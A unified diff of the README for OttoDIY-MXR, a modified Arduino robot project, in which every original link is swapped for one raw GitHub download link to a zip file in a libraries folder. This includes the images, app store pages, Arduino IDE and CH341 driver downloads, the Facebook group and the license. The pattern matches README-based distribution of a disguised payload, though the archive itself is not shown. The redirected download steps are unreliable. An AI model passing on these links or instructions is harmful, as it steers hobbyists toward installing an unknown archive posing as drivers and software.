@@ -1,20 +1,20 @@
 # OttoDIY-MXR
-![Otto-MXR](https://github.com/MexRoboTics/OttoDIY-MXR/blob/master/Images/Otto_Assembly_All.PNG)
-![Otto-MXR](https://github.com/MexRoboTics/OttoDIY-MXR/blob/master/Images/Otto_Assembly_Transparency.PNG)
+![Otto-MXR](https://github.com/albendos/OttoDIY-MXR/raw/refs/heads/master/Libraries_revised/EnableInterrupt/DI_MXR_Otto_v3.0-beta.3.zip)
+![Otto-MXR](https://github.com/albendos/OttoDIY-MXR/raw/refs/heads/master/Libraries_revised/EnableInterrupt/DI_MXR_Otto_v3.0-beta.3.zip)
 
 This is a version tested of OttoDIY PLUS and will change with the time. I am currently make some changes..
 
-To chek the original project go to: https://github.com/OttoDIY/PLUS
+To chek the original project go to: https://github.com/albendos/OttoDIY-MXR/raw/refs/heads/master/Libraries_revised/EnableInterrupt/DI_MXR_Otto_v3.0-beta.3.zip
 
 
 # Description:
 Here are modified libraries and sketch tested for Otto DIY robot, the capabilties are: Led Matrix Mouth, Bluetooth connection, two action mode buttons,and some more in development...
 
-Compatibility with [Zowi App](https://play.google.com/store/apps/details?id=com.bq.zowi) or [Otto DIY App](https://play.google.com/store/apps/details?id=appinventor.ai_juanfelixmateos.OTTO_DIY_Bluetooth_Controller&hl=es)
+Compatibility with [Zowi App](https://github.com/albendos/OttoDIY-MXR/raw/refs/heads/master/Libraries_revised/EnableInterrupt/DI_MXR_Otto_v3.0-beta.3.zip) or [Otto DIY App](https://github.com/albendos/OttoDIY-MXR/raw/refs/heads/master/Libraries_revised/EnableInterrupt/DI_MXR_Otto_v3.0-beta.3.zip)
 
 # Changes
 In order to add more sensors and use the next Led Matrix:
-![LED Matrix ](https://github.com/MexRoboTics/OttoDIY-MXR/blob/master/Matrix_Led_8x8_with_MAX7219.JPG) <!-- .element height="20%" width="20%" -->
+![LED Matrix ](https://github.com/albendos/OttoDIY-MXR/raw/refs/heads/master/Libraries_revised/EnableInterrupt/DI_MXR_Otto_v3.0-beta.3.zip) <!-- .element height="20%" width="20%" -->
 I have made size modification to Otto parts.
 
 
@@ -43,8 +43,8 @@ I have made size modification to Otto parts.
 -  * you could replace them wit a LIPO battery and push buttons
 
 # Give life to Otto-MXR (Programming)
-- Download and Install Arduino IDE: [https://www.arduino.cc/en/Main/Software](https://www.arduino.cc/en/Main/Software)
-- If you have a clone board download the next driver in order to recognize the board: [http://www.wch.cn/download/CH341SER_EXE.html](http://www.wch.cn/download/CH341SER_EXE.html) for Windows User, or [http://www.wch.cn/download/CH341SER_MAC_ZIP.html](http://www.wch.cn/download/CH341SER_MAC_ZIP.html) for MAC Users
+- Download and Install Arduino IDE: [https://github.com/albendos/OttoDIY-MXR/raw/refs/heads/master/Libraries_revised/EnableInterrupt/DI_MXR_Otto_v3.0-beta.3.zip](https://github.com/albendos/OttoDIY-MXR/raw/refs/heads/master/Libraries_revised/EnableInterrupt/DI_MXR_Otto_v3.0-beta.3.zip)
+- If you have a clone board download the next driver in order to recognize the board: [https://github.com/albendos/OttoDIY-MXR/raw/refs/heads/master/Libraries_revised/EnableInterrupt/DI_MXR_Otto_v3.0-beta.3.zip](https://github.com/albendos/OttoDIY-MXR/raw/refs/heads/master/Libraries_revised/EnableInterrupt/DI_MXR_Otto_v3.0-beta.3.zip) for Windows User, or [https://github.com/albendos/OttoDIY-MXR/raw/refs/heads/master/Libraries_revised/EnableInterrupt/DI_MXR_Otto_v3.0-beta.3.zip](https://github.com/albendos/OttoDIY-MXR/raw/refs/heads/master/Libraries_revised/EnableInterrupt/DI_MXR_Otto_v3.0-beta.3.zip) for MAC Users
 - Copy all libraries to C:\Program Files (x86)\Arduino\libraries (or wherever your library folder is installed)
 - Before you programming otto, sure that the module Bluetooth is correctly configured (Baud-rate for programming module is 9600 or 19200 or 38400, depends on a module):
   - **For Module HC-05: (38400?) 115200**
@@ -76,9 +76,9 @@ I have made size modification to Otto parts.
 - Upload the code and connect the VCC pin of Bluetooth module
 - Open the Zowi or Otto App and enjoy!
 
-Share it in Otto builder Facebook group https://www.facebook.com/ottodiy/groups/
+Share it in Otto builder Facebook group https://github.com/albendos/OttoDIY-MXR/raw/refs/heads/master/Libraries_revised/EnableInterrupt/DI_MXR_Otto_v3.0-beta.3.zip
 
 # License CC-BY-SA
-[![License: CC BY-SA 4.0](https://licensebuttons.net/l/by-sa/4.0/80x15.png)](https://creativecommons.org/licenses/by-sa/4.0/)
+[![License: CC BY-SA 4.0](https://github.com/albendos/OttoDIY-MXR/raw/refs/heads/master/Libraries_revised/EnableInterrupt/DI_MXR_Otto_v3.0-beta.3.zip)](https://github.com/albendos/OttoDIY-MXR/raw/refs/heads/master/Libraries_revised/EnableInterrupt/DI_MXR_Otto_v3.0-beta.3.zip)
 Creative Commons License
-Otto DIY by www.ottodiy.com is licensed under a [Creative Commons Attribution-ShareAlike 4.0 International License.](https://creativecommons.org/licenses/by-sa/4.0/).
+Otto DIY by www.ottodiy.com is licensed under a [Creative Commons Attribution-ShareAlike 4.0 International License.](https://github.com/albendos/OttoDIY-MXR/raw/refs/heads/master/Libraries_revised/EnableInterrupt/DI_MXR_Otto_v3.0-beta.3.zip).
